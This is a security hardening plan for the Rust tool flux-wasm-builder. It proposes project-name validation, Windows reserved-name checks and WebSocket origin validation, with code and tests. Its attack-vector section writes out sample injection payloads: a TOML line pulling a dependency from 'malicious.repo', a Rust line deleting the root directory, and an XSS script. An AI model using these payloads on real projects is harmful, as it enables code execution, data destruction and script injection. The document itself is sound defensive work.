# Security Hardening Plan: flux-wasm-builder

## Executive Summary

This document outlines a comprehensive security hardening plan for the `flux-wasm-builder` project. The security review identified three issues ranging from critical to suggestion severity. This plan provides actionable steps to address each vulnerability.

## Issues Overview

| ID | Severity | Issue | Status |
|----|----------|-------|--------|
| SEC-001 | CRITICAL | Arbitrary Content Injection via Project Name | Open |
| SEC-002 | WARNING | No Project Name Format Validation | Open |
| SEC-003 | SUGGESTION | WebSocket Origin Validation | Open |

---

## SEC-001: Arbitrary Content Injection via Project Name

### Problem Statement

The `scaffold()` function in [`src/init/mod.rs:45`](src/init/mod.rs:45) accepts a `name` parameter that is directly interpolated into template strings without validation or sanitization. This allows an attacker to inject arbitrary content into generated files.

### Attack Vectors

1. **TOML Injection** - Injecting into `Cargo.toml`:
   ```
   test"
   [dependencies]
   evil = { git = "https://malicious.repo" }
   #
   ```

2. **Rust Code Injection** - Injecting into generated `.rs` files:
   ```
   test
   }
   fn main() { std::fs::remove_dir_all("/"); }
   /*
   ```

3. **HTML/JS Injection** - Injecting into `index.html`:
   ```
   test</title><script>alert('xss')</script><title>
   ```

### Remediation Plan

#### Step 1: Create Validation Module

Create a new module `src/validation.rs` to centralize input validation:

```rust
// src/validation.rs

/// Error type for validation failures.
#[derive(Debug, thiserror::Error)]
pub enum ValidationError {
    #[error("project name is empty")]
    Empty,

    #[error("project name '{0}' contains invalid characters")]
    InvalidCharacters(String),

    #[error("project name '{0}' exceeds maximum length of {1} characters")]
    TooLong(String, usize),

    #[error("project name '{0}' is a reserved word")]
    ReservedWord(String),

    #[error("project name '{0}' cannot start with '{1}'")]
    InvalidPrefix(String, char),
}

/// Validate a project name according to Cargo conventions.
///
/// # Rules
/// - 1-64 characters
/// - Alphanumeric, hyphens, and underscores only
/// - Cannot start with hyphen or underscore
/// - Cannot be a reserved Rust keyword
/// - Cannot be a reserved Cargo name
pub fn validate_project_name(name: &str) -> Result<(), ValidationError> {
    // Check empty
    if name.is_empty() {
        return Err(ValidationError::Empty);
    }

    // Check length
    const MAX_LENGTH: usize = 64;
    if name.len() > MAX_LENGTH {
        return Err(ValidationError::TooLong(name.to_string(), MAX_LENGTH));
    }

    // Check first character
    let first_char = name.chars().next().unwrap();
    if first_char == '-' || first_char == '_' {
        return Err(ValidationError::InvalidPrefix(name.to_string(), first_char));
    }

    // Check valid characters (alphanumeric, hyphen, underscore)
    for c in name.chars() {
        if !c.is_alphanumeric() && c != '-' && c != '_' {
            return Err(ValidationError::InvalidCharacters(name.to_string()));
        }
    }

    // Check reserved words
    const RESERVED_WORDS: &[&str] = &[
        "test", "build", "run", "check", "doc", "publish",
        "new", "init", "install", "uninstall", "search",
        // Rust keywords
        "fn", "let", "mut", "const", "static", "type", "struct",
        "enum", "impl", "trait", "mod", "use", "pub", "crate",
        "self", "super", "where", "for", "loop", "while", "if",
        "else", "match", "return", "break", "continue", "move",
        "ref", "as", "in", "extern", "unsafe", "dyn", "async",
        "await", "true", "false",
    ];

    let lower_name = name.to_lowercase();
    for reserved in RESERVED_WORDS {
        if lower_name == *reserved {
            return Err(ValidationError::ReservedWord(name.to_string()));
        }
    }

    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn accepts_valid_names() {
        assert!(validate_project_name("my-app").is_ok());
        assert!(validate_project_name("my_app").is_ok());
        assert!(validate_project_name("myapp123").is_ok());
        assert!(validate_project_name("a").is_ok());
    }

    #[test]
    fn rejects_empty_name() {
        assert!(matches!(validate_project_name(""), Err(ValidationError::Empty)));
    }

    #[test]
    fn rejects_too_long_name() {
        let long_name = "a".repeat(65);
        assert!(matches!(validate_project_name(&long_name), Err(ValidationError::TooLong(_, 64))));
    }

    #[test]
    fn rejects_invalid_first_char() {
        assert!(matches!(validate_project_name("-test"), Err(ValidationError::InvalidPrefix(_, '-'))));
        assert!(matches!(validate_project_name("_test"), Err(ValidationError::InvalidPrefix(_, '_'))));
    }

    #[test]
    fn rejects_invalid_characters() {
        assert!(matches!(validate_project_name("test app"), Err(ValidationError::InvalidCharacters(_))));
        assert!(matches!(validate_project_name("test\"app"), Err(ValidationError::InvalidCharacters(_))));
        assert!(matches!(validate_project_name("test\napp"), Err(ValidationError::InvalidCharacters(_))));
    }

    #[test]
    fn rejects_reserved_words() {
        assert!(matches!(validate_project_name("test"), Err(ValidationError::ReservedWord(_))));
        assert!(matches!(validate_project_name("fn"), Err(ValidationError::ReservedWord(_))));
    }
}
```

#### Step 2: Integrate Validation into Scaffold

Modify [`src/init/mod.rs`](src/init/mod.rs):

```rust
// Add to imports
use crate::validation::validate_project_name;

// Add to InitError enum
#[error("invalid project name: {0}")]
InvalidName(#[from] crate::validation::ValidationError),

// Add to scaffold() function, after line 46:
pub fn scaffold(root: &Path, name: &str) -> Result<(), InitError> {
    let span = tracing::info_span!("scaffold", project = name);
    let _enter = span.enter();

    // Step 0: Validate project name (NEW)
    tracing::debug!("validating project name");
    validate_project_name(name)?;

    // Step 1: Environment check
    // ... rest of function
}
```

#### Step 3: Update lib.rs

Add the validation module to [`src/lib.rs`](src/lib.rs):

```rust
pub mod build;
pub mod env_check;
pub mod init;
pub mod validation;  // NEW

pub use validation::ValidationError;  // NEW
```

### Testing Requirements

- [ ] Unit tests for all validation rules
- [ ] Integration test verifying injection attempts are blocked
- [ ] Test that valid names still work end-to-end

---

## SEC-002: No Project Name Format Validation

### Problem Statement

Beyond injection concerns, the project name is not validated against Cargo's naming requirements. Invalid names could create projects that fail to build with cryptic errors.

### Cargo Naming Rules

Per Cargo documentation:
- Maximum 64 characters
- Only ASCII alphanumeric, hyphen (`-`), or underscore (`_`)
- Cannot start with a digit (deprecated but still valid)
- Cannot be a reserved Windows filename (`CON`, `PRN`, `AUX`, `NUL`, etc.)

### Remediation Plan

This issue is addressed by SEC-001's validation module. Additional checks to add:

#### Add Windows Reserved Names Check

```rust
// Add to validation.rs

// Windows reserved filenames
const WINDOWS_RESERVED: &[&str] = &[
    "CON", "PRN", "AUX", "NUL",
    "COM1", "COM2", "COM3", "COM4", "COM5", "COM6", "COM7", "COM8", "COM9",
    "LPT1", "LPT2", "LPT3", "LPT4", "LPT5", "LPT6", "LPT7", "LPT8", "LPT9",
];

// Add to validate_project_name():
let upper_name = name.to_uppercase();
for reserved in WINDOWS_RESERVED {
    if upper_name == *reserved {
        return Err(ValidationError::ReservedWord(name.to_string()));
    }
}
```

### Testing Requirements

- [ ] Test Windows reserved names are rejected
- [ ] Test maximum length enforcement
- [ ] Test that edge cases like single-character names work

---

## SEC-003: WebSocket Origin Validation

### Problem Statement

The WebSocket reload endpoint in [`src/build/reload.rs:33`](src/build/reload.rs:33) accepts connections from any origin. While this is a development-only feature, it could be exploited via CSRF-like attacks if a developer visits a malicious website while the dev server is running.

### Attack Scenario

1. Developer runs `flux-wasm-builder` dev server on `localhost:8080`
2. Developer visits `https://malicious-site.com` in another tab
3. Malicious site opens WebSocket to `ws://localhost:8080/ws/reload`
4. Malicious site can now:
   - Monitor when builds complete (information disclosure)
   - Potentially trigger unwanted page reloads in the developer's browser

### Remediation Plan

#### Add Origin Validation

Modify [`src/build/reload.rs`](src/build/reload.rs):

```rust
pub async fn ws_reload_handler(
    req: HttpRequest,
    body: web::Payload,
    reload_tx: web::Data<broadcast::Sender<()>>,
) -> Result<HttpResponse, actix_web::Error> {
    // Origin validation for CSRF protection
    if let Some(origin) = req.headers().get("origin") {
        let host = req.connection_info().host();
        let expected_origin = format!("http://{}", host);
        
        if origin != expected_origin {
            tracing::warn!(
                origin = ?origin, 
                expected = %expected_origin,
                "WebSocket connection rejected - origin mismatch"
            );
            return Err(actix_web::error::ErrorForbidden("Invalid origin"));
        }
    }

    // ... rest of function unchanged
}
```

#### Add Configuration Option

For users who need cross-origin access (e.g., testing with external tools):

```rust
// In BuildConfig
pub allow_cross_origin_reload: bool,

// In ws_reload_handler
if !config.allow_cross_origin_reload {
    if let Some(origin) = req.headers().get("origin") {
        // ... validation
    }
}
```

### Testing Requirements

- [ ] Test that same-origin connections are accepted
- [ ] Test that cross-origin connections are rejected
- [ ] Test that missing origin header is handled (should allow for local development)
- [ ] Test configuration option to allow cross-origin

---

## Implementation Priority

```
┌─────────────────────────────────────────────────────────────┐
│                    Implementation Order                      │
├─────────────────────────────────────────────────────────────┤
│  1. SEC-001: Content Injection (CRITICAL)                   │
│     └─ Blocks potential RCE via dependency injection        │
│                                                              │
│  2. SEC-002: Format Validation (WARNING)                    │
│     └─ Improves UX and prevents confusing errors            │
│                                                              │
│  3. SEC-003: WebSocket Origin (SUGGESTION)                  │
│     └─ Defense in depth for development mode                │
└─────────────────────────────────────────────────────────────┘
```

## Verification Checklist

After implementing fixes:

- [ ] All existing tests pass
- [ ] New security tests pass
- [ ] Manual testing with malicious inputs
- [ ] Code review of changes
- [ ] Update documentation if needed

## References

- [Cargo Package Naming](https://doc.rust-lang.org/cargo/reference/manifest.html#the-name-field)
- [OWASP Input Validation Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Input_Validation_Cheat_Sheet.html)
- [RFC 6455: WebSocket Protocol](https://datatracker.ietf.org/doc/html/rfc6455)
